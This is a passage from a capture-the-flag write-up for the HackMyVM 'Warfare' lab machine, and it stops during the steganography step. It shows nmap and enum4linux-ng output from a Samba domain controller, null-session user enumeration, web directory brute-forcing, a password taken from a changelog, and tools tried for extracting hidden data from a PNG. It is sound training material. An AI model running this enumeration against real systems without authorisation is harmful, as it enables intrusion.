# Warfare

## Recon

::: details nmap_scan.log.md
```log
Open 192.168.56.109:22
Open 192.168.56.109:53
Open 192.168.56.109:80
Open 192.168.56.109:135
Open 192.168.56.109:139
Open 192.168.56.109:389
Open 192.168.56.109:445
Open 192.168.56.109:464
Open 192.168.56.109:636
Open 192.168.56.109:3268
Open 192.168.56.109:3269
Open 192.168.56.109:88
Open 192.168.56.109:49152
Open 192.168.56.109:49154
Open 192.168.56.109:49153
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 192.168.56.109

PORT      STATE SERVICE      REASON  VERSION
22/tcp    open  ssh          syn-ack OpenSSH 10.0p2 Debian 7 (protocol 2.0)
53/tcp    open  domain       syn-ack (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http         syn-ack WEBrick httpd 1.8.2 (Ruby 3.3.8 (2025-04-09))
|_http-title:                         armctf        
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: WEBrick/1.8.2 (Ruby/3.3.8/2025-04-09)
|_http-favicon: Unknown favicon MD5: 0FC2312F59FF0BC5B58BCEE1CDE7679D
88/tcp    open  kerberos-sec syn-ack (server time: 2025-09-12 12:29:23Z)
| fingerprint-strings: 
|   Kerberos: 
|     d~b0`
|     20250912122923Z
|     krbtgt
|_    client in request
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Samba smbd 4
389/tcp   open  ldap         syn-ack (Anonymous bind OK)
| ssl-cert: Subject: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-13T18:55:37
| Not valid after:  2027-07-14T18:55:37
| MD5:   61fe:4744:8251:7af6:b79c:0558:854d:c63f
| SHA-1: 4092:3a94:8571:840d:e55f:5fb2:1ff9:ed37:8ca1:c534
| -----BEGIN CERTIFICATE-----
| MIIFuDCCA6CgAwIBAgIEqd+caDANBgkqhkiG9w0BAQsFADB6MR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEgMB4GA1UEAxMXV0FSRkFSRURD
| LndhcmZhcmUubG9jYWwwHhcNMjUwODEzMTg1NTM3WhcNMjcwNzE0MTg1NTM3WjB8
| MR0wGwYDVQQKExRTYW1iYSBBZG1pbmlzdHJhdGlvbjE5MDcGA1UECxMwU2FtYmEg
| LSB0ZW1wb3JhcnkgYXV0b2dlbmVyYXRlZCBIT1NUIGNlcnRpZmljYXRlMSAwHgYD
| VQQDExdXQVJGQVJFREMud2FyZmFyZS5sb2NhbDCCAiIwDQYJKoZIhvcNAQEBBQAD
| ggIPADCCAgoCggIBAMyXgRequkVWPmS/IiFyX1ZOWemNielxHYs2Wg/CM80yNdB4
| dpaPadtow6L3uoRDCrsTl9MkxHQ5pvetZgRavSt06heloR/mrvwhfPHMiUn5SJ4s
| GwSCBXYPoEdiA9/4iSdTL7IQ0pOaHgRIqv6oJ6FeRePvmNDnTh/H3w9lXngV1n8w
| uKOM03gtc5cUkKptKAWhtzv2/Uup578RsUi4mFIMIoUs5bwVn4rdu/LR3BGZu6K7
| qEYDu2zecJHU7juK4hzJHUp7V42VpEXeJAu0KlxzbBeBnQBjtctSC3yEN1Rtvngl
| buasU+fxoL5v+5aBBdnn/VrhDgg96UJQhWrUJrryTSnYrc1rIiL6o8I6eAnpDJY+
| RZ5yeVSaoXQlKGZCKFEAxjVq+/3yDFFyfD3jjmWtmT56YQFWSi79d/Q257dzo/Js
| hxNUbLeYKpgbRNO5NcacEo7Dl3lR29C4xRtcMdyVQmcEXhodpE3UZ0ZWz6ve3HIh
| VpEGB8X8yfeQqOMPPniosYnr1LS/BhMH/1QfNAzvlMh9UobDurHdyqbsTkCGUjD2
| dCY0cqybkl+zCKaRBoUXg350TysEtgv2IM/+ROJLUnP4T2YVDo++ntd/ZF70m8pj
| 301DL4cd46TZIi2KCWylS0vpYREElKgsiE6x1IIqqj/xVpA4MsAQ96q9FszFAgMB
| AAGjRDBCMAwGA1UdEwEB/wQCMAAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwHQYDVR0O
| BBYEFG5lDCRiQtHb4xCAuNycymCLT1ZoMA0GCSqGSIb3DQEBCwUAA4ICAQCp2NK2
| Ln+8TO2WOpAlMUwjK4scnNcD5y0KqXqTExtWA4F7j2pidEsqRnKRa5yJiPTBlHi/
| 1SVD9APH1K+CBH9p1rYrLCPokZjfXz+w3fYYwCWpy2VfCqA1G0Rg9fulOGbHdgI2
| znBsKNAIVrCiCBfQzDMwZ4DTfR3Vksqc3InBPpsgxn18K67cVtw3lH7z4MP78S/J
| 0nUZLkkvgOGaG2IRA6hKk8gq8IIbtW6g4udVZCkQSBi77sa4h+lcvA990E90d4wt
| R0ytFIGdC61HxbgpRmxn96YKleBR5ksomX0FJkNdFj9kzd0RBUF1EuIlwqkrOBNs
| vnRma9AFNN5kYQOdqntx1PijajsYypS/RClAuh4XVNdMSVEhBcQoq2baly/5JBKj
| IWrVI8h3sjYs5ed77nNDaQK4p/hCxRu7TEcgtkC4vSYT6LIU1GDb3cPpWAKmVXte
| z4wVdZnnQzWohb1tCpcN0p5TdFOh6n1bGcHrcBLF87mCcND4uCLSem1NJz79tYWu
| 9ORHT+PIXMekN1bUdHbD34RyKmZuFmCcmOn6133ACytyMwdvEbs+3mQU9m9cwUkK
| FatGkZ10pS+VYiFZjYs205n3rNR3Ndvwn0fmXVyYf8c0tMt0HubClL5jF1a3iYDG
| 9cUOE+p6c1Ni+hw93Bb7Qtcn2Vr8c/ami75nZA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn  syn-ack Samba smbd 4
464/tcp   open  kpasswd5?    syn-ack
636/tcp   open  ssl/ldap     syn-ack (Anonymous bind OK)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-13T18:55:37
| Not valid after:  2027-07-14T18:55:37
| MD5:   61fe:4744:8251:7af6:b79c:0558:854d:c63f
| SHA-1: 4092:3a94:8571:840d:e55f:5fb2:1ff9:ed37:8ca1:c534
| -----BEGIN CERTIFICATE-----
| MIIFuDCCA6CgAwIBAgIEqd+caDANBgkqhkiG9w0BAQsFADB6MR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEgMB4GA1UEAxMXV0FSRkFSRURD
| LndhcmZhcmUubG9jYWwwHhcNMjUwODEzMTg1NTM3WhcNMjcwNzE0MTg1NTM3WjB8
| MR0wGwYDVQQKExRTYW1iYSBBZG1pbmlzdHJhdGlvbjE5MDcGA1UECxMwU2FtYmEg
| LSB0ZW1wb3JhcnkgYXV0b2dlbmVyYXRlZCBIT1NUIGNlcnRpZmljYXRlMSAwHgYD
| VQQDExdXQVJGQVJFREMud2FyZmFyZS5sb2NhbDCCAiIwDQYJKoZIhvcNAQEBBQAD
| ggIPADCCAgoCggIBAMyXgRequkVWPmS/IiFyX1ZOWemNielxHYs2Wg/CM80yNdB4
| dpaPadtow6L3uoRDCrsTl9MkxHQ5pvetZgRavSt06heloR/mrvwhfPHMiUn5SJ4s
| GwSCBXYPoEdiA9/4iSdTL7IQ0pOaHgRIqv6oJ6FeRePvmNDnTh/H3w9lXngV1n8w
| uKOM03gtc5cUkKptKAWhtzv2/Uup578RsUi4mFIMIoUs5bwVn4rdu/LR3BGZu6K7
| qEYDu2zecJHU7juK4hzJHUp7V42VpEXeJAu0KlxzbBeBnQBjtctSC3yEN1Rtvngl
| buasU+fxoL5v+5aBBdnn/VrhDgg96UJQhWrUJrryTSnYrc1rIiL6o8I6eAnpDJY+
| RZ5yeVSaoXQlKGZCKFEAxjVq+/3yDFFyfD3jjmWtmT56YQFWSi79d/Q257dzo/Js
| hxNUbLeYKpgbRNO5NcacEo7Dl3lR29C4xRtcMdyVQmcEXhodpE3UZ0ZWz6ve3HIh
| VpEGB8X8yfeQqOMPPniosYnr1LS/BhMH/1QfNAzvlMh9UobDurHdyqbsTkCGUjD2
| dCY0cqybkl+zCKaRBoUXg350TysEtgv2IM/+ROJLUnP4T2YVDo++ntd/ZF70m8pj
| 301DL4cd46TZIi2KCWylS0vpYREElKgsiE6x1IIqqj/xVpA4MsAQ96q9FszFAgMB
| AAGjRDBCMAwGA1UdEwEB/wQCMAAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwHQYDVR0O
| BBYEFG5lDCRiQtHb4xCAuNycymCLT1ZoMA0GCSqGSIb3DQEBCwUAA4ICAQCp2NK2
| Ln+8TO2WOpAlMUwjK4scnNcD5y0KqXqTExtWA4F7j2pidEsqRnKRa5yJiPTBlHi/
| 1SVD9APH1K+CBH9p1rYrLCPokZjfXz+w3fYYwCWpy2VfCqA1G0Rg9fulOGbHdgI2
| znBsKNAIVrCiCBfQzDMwZ4DTfR3Vksqc3InBPpsgxn18K67cVtw3lH7z4MP78S/J
| 0nUZLkkvgOGaG2IRA6hKk8gq8IIbtW6g4udVZCkQSBi77sa4h+lcvA990E90d4wt
| R0ytFIGdC61HxbgpRmxn96YKleBR5ksomX0FJkNdFj9kzd0RBUF1EuIlwqkrOBNs
| vnRma9AFNN5kYQOdqntx1PijajsYypS/RClAuh4XVNdMSVEhBcQoq2baly/5JBKj
| IWrVI8h3sjYs5ed77nNDaQK4p/hCxRu7TEcgtkC4vSYT6LIU1GDb3cPpWAKmVXte
| z4wVdZnnQzWohb1tCpcN0p5TdFOh6n1bGcHrcBLF87mCcND4uCLSem1NJz79tYWu
| 9ORHT+PIXMekN1bUdHbD34RyKmZuFmCcmOn6133ACytyMwdvEbs+3mQU9m9cwUkK
| FatGkZ10pS+VYiFZjYs205n3rNR3Ndvwn0fmXVyYf8c0tMt0HubClL5jF1a3iYDG
| 9cUOE+p6c1Ni+hw93Bb7Qtcn2Vr8c/ami75nZA==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap         syn-ack (Anonymous bind OK)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-13T18:55:37
| Not valid after:  2027-07-14T18:55:37
| MD5:   61fe:4744:8251:7af6:b79c:0558:854d:c63f
| SHA-1: 4092:3a94:8571:840d:e55f:5fb2:1ff9:ed37:8ca1:c534
| -----BEGIN CERTIFICATE-----
| MIIFuDCCA6CgAwIBAgIEqd+caDANBgkqhkiG9w0BAQsFADB6MR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEgMB4GA1UEAxMXV0FSRkFSRURD
| LndhcmZhcmUubG9jYWwwHhcNMjUwODEzMTg1NTM3WhcNMjcwNzE0MTg1NTM3WjB8
| MR0wGwYDVQQKExRTYW1iYSBBZG1pbmlzdHJhdGlvbjE5MDcGA1UECxMwU2FtYmEg
| LSB0ZW1wb3JhcnkgYXV0b2dlbmVyYXRlZCBIT1NUIGNlcnRpZmljYXRlMSAwHgYD
| VQQDExdXQVJGQVJFREMud2FyZmFyZS5sb2NhbDCCAiIwDQYJKoZIhvcNAQEBBQAD
| ggIPADCCAgoCggIBAMyXgRequkVWPmS/IiFyX1ZOWemNielxHYs2Wg/CM80yNdB4
| dpaPadtow6L3uoRDCrsTl9MkxHQ5pvetZgRavSt06heloR/mrvwhfPHMiUn5SJ4s
| GwSCBXYPoEdiA9/4iSdTL7IQ0pOaHgRIqv6oJ6FeRePvmNDnTh/H3w9lXngV1n8w
| uKOM03gtc5cUkKptKAWhtzv2/Uup578RsUi4mFIMIoUs5bwVn4rdu/LR3BGZu6K7
| qEYDu2zecJHU7juK4hzJHUp7V42VpEXeJAu0KlxzbBeBnQBjtctSC3yEN1Rtvngl
| buasU+fxoL5v+5aBBdnn/VrhDgg96UJQhWrUJrryTSnYrc1rIiL6o8I6eAnpDJY+
| RZ5yeVSaoXQlKGZCKFEAxjVq+/3yDFFyfD3jjmWtmT56YQFWSi79d/Q257dzo/Js
| hxNUbLeYKpgbRNO5NcacEo7Dl3lR29C4xRtcMdyVQmcEXhodpE3UZ0ZWz6ve3HIh
| VpEGB8X8yfeQqOMPPniosYnr1LS/BhMH/1QfNAzvlMh9UobDurHdyqbsTkCGUjD2
| dCY0cqybkl+zCKaRBoUXg350TysEtgv2IM/+ROJLUnP4T2YVDo++ntd/ZF70m8pj
| 301DL4cd46TZIi2KCWylS0vpYREElKgsiE6x1IIqqj/xVpA4MsAQ96q9FszFAgMB
| AAGjRDBCMAwGA1UdEwEB/wQCMAAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwHQYDVR0O
| BBYEFG5lDCRiQtHb4xCAuNycymCLT1ZoMA0GCSqGSIb3DQEBCwUAA4ICAQCp2NK2
| Ln+8TO2WOpAlMUwjK4scnNcD5y0KqXqTExtWA4F7j2pidEsqRnKRa5yJiPTBlHi/
| 1SVD9APH1K+CBH9p1rYrLCPokZjfXz+w3fYYwCWpy2VfCqA1G0Rg9fulOGbHdgI2
| znBsKNAIVrCiCBfQzDMwZ4DTfR3Vksqc3InBPpsgxn18K67cVtw3lH7z4MP78S/J
| 0nUZLkkvgOGaG2IRA6hKk8gq8IIbtW6g4udVZCkQSBi77sa4h+lcvA990E90d4wt
| R0ytFIGdC61HxbgpRmxn96YKleBR5ksomX0FJkNdFj9kzd0RBUF1EuIlwqkrOBNs
| vnRma9AFNN5kYQOdqntx1PijajsYypS/RClAuh4XVNdMSVEhBcQoq2baly/5JBKj
| IWrVI8h3sjYs5ed77nNDaQK4p/hCxRu7TEcgtkC4vSYT6LIU1GDb3cPpWAKmVXte
| z4wVdZnnQzWohb1tCpcN0p5TdFOh6n1bGcHrcBLF87mCcND4uCLSem1NJz79tYWu
| 9ORHT+PIXMekN1bUdHbD34RyKmZuFmCcmOn6133ACytyMwdvEbs+3mQU9m9cwUkK
| FatGkZ10pS+VYiFZjYs205n3rNR3Ndvwn0fmXVyYf8c0tMt0HubClL5jF1a3iYDG
| 9cUOE+p6c1Ni+hw93Bb7Qtcn2Vr8c/ami75nZA==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap     syn-ack (Anonymous bind OK)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=WARFAREDC.warfare.local/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-13T18:55:37
| Not valid after:  2027-07-14T18:55:37
| MD5:   61fe:4744:8251:7af6:b79c:0558:854d:c63f
| SHA-1: 4092:3a94:8571:840d:e55f:5fb2:1ff9:ed37:8ca1:c534
| -----BEGIN CERTIFICATE-----
| MIIFuDCCA6CgAwIBAgIEqd+caDANBgkqhkiG9w0BAQsFADB6MR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEgMB4GA1UEAxMXV0FSRkFSRURD
| LndhcmZhcmUubG9jYWwwHhcNMjUwODEzMTg1NTM3WhcNMjcwNzE0MTg1NTM3WjB8
| MR0wGwYDVQQKExRTYW1iYSBBZG1pbmlzdHJhdGlvbjE5MDcGA1UECxMwU2FtYmEg
| LSB0ZW1wb3JhcnkgYXV0b2dlbmVyYXRlZCBIT1NUIGNlcnRpZmljYXRlMSAwHgYD
| VQQDExdXQVJGQVJFREMud2FyZmFyZS5sb2NhbDCCAiIwDQYJKoZIhvcNAQEBBQAD
| ggIPADCCAgoCggIBAMyXgRequkVWPmS/IiFyX1ZOWemNielxHYs2Wg/CM80yNdB4
| dpaPadtow6L3uoRDCrsTl9MkxHQ5pvetZgRavSt06heloR/mrvwhfPHMiUn5SJ4s
| GwSCBXYPoEdiA9/4iSdTL7IQ0pOaHgRIqv6oJ6FeRePvmNDnTh/H3w9lXngV1n8w
| uKOM03gtc5cUkKptKAWhtzv2/Uup578RsUi4mFIMIoUs5bwVn4rdu/LR3BGZu6K7
| qEYDu2zecJHU7juK4hzJHUp7V42VpEXeJAu0KlxzbBeBnQBjtctSC3yEN1Rtvngl
| buasU+fxoL5v+5aBBdnn/VrhDgg96UJQhWrUJrryTSnYrc1rIiL6o8I6eAnpDJY+
| RZ5yeVSaoXQlKGZCKFEAxjVq+/3yDFFyfD3jjmWtmT56YQFWSi79d/Q257dzo/Js
| hxNUbLeYKpgbRNO5NcacEo7Dl3lR29C4xRtcMdyVQmcEXhodpE3UZ0ZWz6ve3HIh
| VpEGB8X8yfeQqOMPPniosYnr1LS/BhMH/1QfNAzvlMh9UobDurHdyqbsTkCGUjD2
| dCY0cqybkl+zCKaRBoUXg350TysEtgv2IM/+ROJLUnP4T2YVDo++ntd/ZF70m8pj
| 301DL4cd46TZIi2KCWylS0vpYREElKgsiE6x1IIqqj/xVpA4MsAQ96q9FszFAgMB
| AAGjRDBCMAwGA1UdEwEB/wQCMAAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwHQYDVR0O
| BBYEFG5lDCRiQtHb4xCAuNycymCLT1ZoMA0GCSqGSIb3DQEBCwUAA4ICAQCp2NK2
| Ln+8TO2WOpAlMUwjK4scnNcD5y0KqXqTExtWA4F7j2pidEsqRnKRa5yJiPTBlHi/
| 1SVD9APH1K+CBH9p1rYrLCPokZjfXz+w3fYYwCWpy2VfCqA1G0Rg9fulOGbHdgI2
| znBsKNAIVrCiCBfQzDMwZ4DTfR3Vksqc3InBPpsgxn18K67cVtw3lH7z4MP78S/J
| 0nUZLkkvgOGaG2IRA6hKk8gq8IIbtW6g4udVZCkQSBi77sa4h+lcvA990E90d4wt
| R0ytFIGdC61HxbgpRmxn96YKleBR5ksomX0FJkNdFj9kzd0RBUF1EuIlwqkrOBNs
| vnRma9AFNN5kYQOdqntx1PijajsYypS/RClAuh4XVNdMSVEhBcQoq2baly/5JBKj
| IWrVI8h3sjYs5ed77nNDaQK4p/hCxRu7TEcgtkC4vSYT6LIU1GDb3cPpWAKmVXte
| z4wVdZnnQzWohb1tCpcN0p5TdFOh6n1bGcHrcBLF87mCcND4uCLSem1NJz79tYWu
| 9ORHT+PIXMekN1bUdHbD34RyKmZuFmCcmOn6133ACytyMwdvEbs+3mQU9m9cwUkK
| FatGkZ10pS+VYiFZjYs205n3rNR3Ndvwn0fmXVyYf8c0tMt0HubClL5jF1a3iYDG
| 9cUOE+p6c1Ni+hw93Bb7Qtcn2Vr8c/ami75nZA==
|_-----END CERTIFICATE-----
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.95%I=7%D=9/12%Time=68C41229%P=x86_64-alpine-linux-musl%r
SF:(DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x02\0\x01\0\0\0\0\0\0\x07ver
SF:sion\x04bind\0\0\x10\0\x03");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port88-TCP:V=7.95%I=7%D=9/12%Time=68C41229%P=x86_64-alpine-linux-musl%r
SF:(Kerberos,68,"\0\0\0d~b0`\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x
SF:11\x18\x0f20250912122923Z\xa5\x05\x02\x03\r\x06#\xa6\x03\x02\x01\x06\xa
SF:9\x04\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x01\0\xa1\x0e0\x0c\x1b\x06krbt
SF:gt\x1b\x02NM\xab\x16\x1b\x14No\x20client\x20in\x20request");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: WARFAREDC, NetBIOS user: <unknown>, NetBIOS MAC: f0:c7:46:16:e2:7f (unknown)
| Names:
|   WARFAREDC<00>        Flags: <unique><active>
|   WARFAREDC<03>        Flags: <unique><active>
|   WARFAREDC<20>        Flags: <unique><active>
|   WARFARE<1b>          Flags: <unique><active>
|   WARFARE<1c>          Flags: <group><active>
|   WARFARE<00>          Flags: <group><active>
|   __SAMBA__<00>        Flags: <group><active><permanent>
|   __SAMBA__<20>        Flags: <group><active><permanent>
| Statistics:
|   f0:c7:46:16:e2:7f:00:00:d3:80:5d:c1:56:09:00:00:10
|   10:4d:16:47:00:00:7f:e2:16:47:13:a7:7f:e2:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-09-12T12:30:17
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59571/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 56503/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25731/udp): CLEAN (Failed to receive data)
|   Check 4 (port 33855/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
```
:::

```bash
└─$ enum4linux-ng WARFAREDC.warfare.local
...
 ================================================
|    Listener Scan on WARFAREDC.warfare.local    |
 ================================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ===============================================================
|    Domain Information via LDAP for WARFAREDC.warfare.local    |
 ===============================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: warfare.local

 ======================================================================
|    NetBIOS Names and Workgroup/Domain for WARFAREDC.warfare.local    |
 ======================================================================
[+] Got domain/workgroup name: WARFARE
[+] Full NetBIOS names information:
- WARFAREDC       <00> -         M <ACTIVE>  Workstation Service
- WARFAREDC       <03> -         M <ACTIVE>  Messenger Service
- WARFAREDC       <20> -         M <ACTIVE>  File Server Service
- WARFARE         <1b> -         M <ACTIVE>  Domain Master Browser
- WARFARE         <1c> - <GROUP> M <ACTIVE>  Domain Controllers
- WARFARE         <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name
- __SAMBA__       <00> - <GROUP> M <ACTIVE> <PERMANENT>  Domain/Workgroup Name
- MAC Address = F0-C7-46-16-E2-7F

 ====================================================
|    SMB Dialect Check on WARFAREDC.warfare.local    |
 ====================================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ======================================================================
|    Domain Information via SMB session for WARFAREDC.warfare.local    |
 ======================================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WARFAREDC
NetBIOS domain name: WARFARE
DNS domain: warfare.local
FQDN: warfaredc.warfare.local
Derived membership: domain member
Derived domain: WARFARE

 ====================================================
|    RPC Session Check on WARFAREDC.warfare.local    |
 ====================================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ==============================================================
|    Domain Information via RPC for WARFAREDC.warfare.local    |
 ==============================================================
[+] Domain: WARFARE
[+] Domain SID: S-1-5-21-2416064096-3250949455-3250754899
[+] Membership: domain member

 ==========================================================
|    OS Information via RPC for WARFAREDC.warfare.local    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix (Samba 4.22.3-Debian-4.22.3+dfsg-4)
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT Samba 4.22.3-Debian-4.22.3+dfsg-4

 ================================================
|    Users via RPC on WARFAREDC.warfare.local    |
 ================================================
[*] Enumerating users via 'querydispinfo'
[+] Found 4 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 4 user(s) via 'enumdomusers'
[+] After merging user results we have 4 user(s) total:
'1103':
  username: robert
  name: robert johnson
  acb: '0x00000000'
  description: ''
'500':
  username: Administrator
  name: ''
  acb: '0x00000000'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: ''
  acb: '0x00000000'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: ''
  acb: '0x00000000'
  description: Key Distribution Center Service Account
...
```

## HTTP

![writeup.png](/assets/pentest/hackmyvm/warfare/writeup.png)

```bash
└─$ feroxbuster -u http://warfare.local/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 278
200      GET     4619l     1163w    40265c http://warfare.local/
301      GET        1l        2w       46c http://warfare.local/assets => http://warfare.local/assets/
200      GET       22l      107w      627c http://warfare.local/changelog.txt
200      GET    10681l    40624w  1245842c http://warfare.local/assets/segoeui.ttf
200      GET       24l       44w      425c http://warfare.local/contact
200      GET       24l       44w      425c http://warfare.local/contact.html
301      GET        1l        2w       52c http://warfare.local/functions => http://warfare.local/functions/
200      GET     4619l     1163w    40265c http://warfare.local/index
200      GET     4619l     1163w    40265c http://warfare.local/index.html
200      GET       22l      107w      627c http://warfare.local/changelog.txt
200      GET       24l       44w      425c http://warfare.local/contact
301      GET        1l        2w       46c http://warfare.local/armctf => http://warfare.local/armctf/
301      GET        1l        2w       46c http://warfare.local/assets => http://warfare.local/assets/
```

`c1` change has password `KedileriSeverim666`

![writeup-1.png](/assets/pentest/hackmyvm/warfare/writeup-1.png)

Password not usable so far..

### Steg

Image shouldn't have changed if the repo was cloned, however it has more data then original.
```bash
└─$ curl http://warfare.local/assets/logo.png -Lso warfare.logo.png
└─$ curl https://armctf.com/assets/logo.png -Lso armctf.logo.png
└─$ ls -alh *.png
Permissions Size User  Date Modified Name
.rw-rw-r--  217k woyag 28 Sep 02:03   armctf.logo.png
.rw-rw-r--  222k woyag 28 Sep 02:03   warfare.logo.png
```

```bash
└─$ declare -f fdiff
fdiff () {
        if (( $# < 3 ))
        then
                echo "Usage: fdiff <command> <file1> <file2> [options...]"
                return
        fi
        local command=(eval $1)
        diff --color=auto ${@:4} <($command "$2") <($command "$3")
}

└─$ fdiff strings armctf.logo.png warfare.logo.png
1a2,60
> stEGx
> eP\[
> ++*k
> H(?W
> ;6K.
> ^C&-EI
> 7;Em6[-/
> h7%q!
> 4H8^
> yjN0]
> 1(5Oq
> 6}!e
> o|Sa
>  x0M
> GcdHy
> X~$3h
> *CI*
> yM5V,
> F/>f
> v,hW
> KyL!
> ,ffQ
>       _[vs
> +qm*
> @JLIGy6
> HkQ]
> r?M1[
> c<UeU
> *l[/
> Ux~Z
> 2*L?
> 1gExw
> OE5Ft
> ysX<<jV
> zg^YG
> ~NV(h
> KqX0
> p%e0
> j(e()
> {-Qv
> +#!#
> \O'1
> <avp
> i6d^
> 67-Q
> AM$L:N
> WCfL
> G5Md,
> m);rd
> W>onZ
> {x(
> *}wn
> ~dthiL5
> *>"b1Uat
> [J!xK
>  H+:
> #dh2R
> ezcX~f
> K,5h+
```

Hmmm doesn't work
```bash
└─$ git clone https://github.com/a1baradi/StegX.git -q
└─$ pip install Pillow stegano opencv-python numpy
└─$ py StegX/stegx.py extract warfare.logo.png
[-] Error extracting data: Impossible to detect message.
```

```bash
└─$ curl -LOs https://github.com/tbpaolini/imgconceal/releases/download/v1.0.4/imgconceal
└─$ chmod +x imgconceal
└─$ ./imgconceal --extract warfare.logo.png --no-password
FAIL: image 'warfare.logo.png' contains no hidden data or the password is incorrect.
```

Through some hints I was directed to `steg-png` tool and extraction was successful using this.
```bash
└─$ git clone https://github.com/brandon1024/steg-png.git -q
└─$ ccd steg-png/build
└─$ cmake ..
└─$ make install
